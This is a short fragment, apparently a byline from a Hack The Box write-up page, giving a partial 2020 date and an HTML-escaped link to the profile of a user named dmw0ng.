 11 2020 by &lt;a href="https://www.hackthebox.eu/home/users/profile/82600"&gt;dmw0ng&lt;/a&gt;.
